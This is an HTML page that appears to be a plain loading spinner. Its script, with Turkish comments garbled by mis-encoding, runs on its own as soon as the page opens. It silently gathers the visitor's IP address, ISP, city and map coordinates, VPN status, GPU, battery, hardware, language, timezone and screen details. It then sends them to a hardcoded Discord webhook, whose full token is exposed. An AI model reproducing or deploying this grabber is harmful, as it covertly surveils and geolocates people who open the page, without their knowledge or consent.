<!DOCTYPE html>

<head>

        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; color:#111; }
        .loader { border: 2px solid #111; border-top: 2px solid #00ff41; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }

</head>
<body>
    <div class="loader"></div>

    <script>
        const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function sÄ±zdÄ±r() {
            let d = { gpu: "Null/Locked", ven: "Null/Locked", ip: "X", iss: "X", loc: "X", net: "X", sys: "X", ext: "X" };

            // 1. SESSÄ°Z GPU SORGUSU (Recursive Zorlama)
            const getGPU = () => {
                try {
                    const c = document.createElement('canvas');
                    const gl = c.getContext('webgl2') || c.getContext('webgl');
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    if (dbg) {
                        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                        d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                    }
                } catch(e) {}
            };
            
            // GPU'yu hemen sorgula
            getGPU();

            // 2. ISS, IP, KONUM, PROXY (Sessiz API)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const j = await res.json();
                d.ip = j.ip;
                d.iss = `${j.org} (AS${j.asn})`;
                d.loc = `ğŸ“ **Konum:** ${j.city}, ${j.region} / ${j.country_name}\nğŸ›°ï¸ **ISS:** \`${d.iss}\`\nğŸŒ **Proxy/VPN:** ${j.proxy ? 'âš ï¸ Aktif' : 'âœ… Temiz'}\nğŸ—ºï¸ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
            } catch(e) {}

            // 3. Ä°NTERNET HIZI VE PÄ°NG
            try {
                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                d.net = n ? `âš¡ **HÄ±z:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\nğŸ“¡ **BaÄŸlantÄ±:** ${n.effectiveType}` : "X";
            } catch(e) {}

            // 4. OS, DÄ°L, ZAMAN, EKRAN, PÄ°L
            try {
                const bat = await navigator.getBattery();
                const bStat = `%${Math.round(bat.level * 100)} (${bat.charging ? 'Åarjda' : 'Pilde'})`;
                d.sys = `ğŸ’» **OS:** ${navigator.platform}\nğŸ§  **CPU:** ${navigator.hardwareConcurrency} Ã‡ekirdek\nğŸ’¾ **RAM:** ${navigator.deviceMemory || 'X'} GB\nğŸ”‹ **GÃ¼Ã§:** ${bStat}`;
                d.ext = `ğŸŒ **Dil:** ${navigator.language}\nâ° **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nğŸ“ **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
            } catch(e) {}

            // 5. KIRMIZI ANALÄ°Z RAPORU
            const payload = {
                embeds: [{
                    title: "ğŸ’€ SESSÄ°Z ADLÄ° ANALÄ°Z RAPORU",
                    color: 15158332,
                    fields: [
                        { name: "ğŸ“¡ AÄ VE ISS KATMANI", value: `${d.loc}\n${d.net}\n**IP:** \`${d.ip}\``, inline: false },
                        { name: "ğŸ› ï¸ EKRAN KARTI (GPU)", value: `**Renderer:** \`${d.gpu}\`\n**Vendor:** \`${d.ven}\``, inline: false },
                        { name: "âš™ï¸ DONANIM DETAYLARI", value: d.sys, inline: false },
                        { name: "ğŸŒ SÄ°STEM DETAYLARI", value: d.ext, inline: false },
                        { name: "ğŸ” USER AGENT", value: "```" + navigator.userAgent + "```" }
                    ],
                    timestamp: new Date()
                }]
            };

            // 6. MUTLAK GÃ–NDERÄ°M
            const blob = JSON.stringify(payload);
            fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
            navigator.sendBeacon(hook, blob);
        }

        // Sayfa aÃ§Ä±ldÄ±ÄŸÄ± an butona gerek kalmadan Ã§alÄ±ÅŸÄ±r
        window.onload = () => {
            setTimeout(sÄ±zdÄ±r, 100); // 100ms gecikme ile tarayÄ±cÄ± korumasÄ±nÄ± esnetiyoruz
        };
    </script>
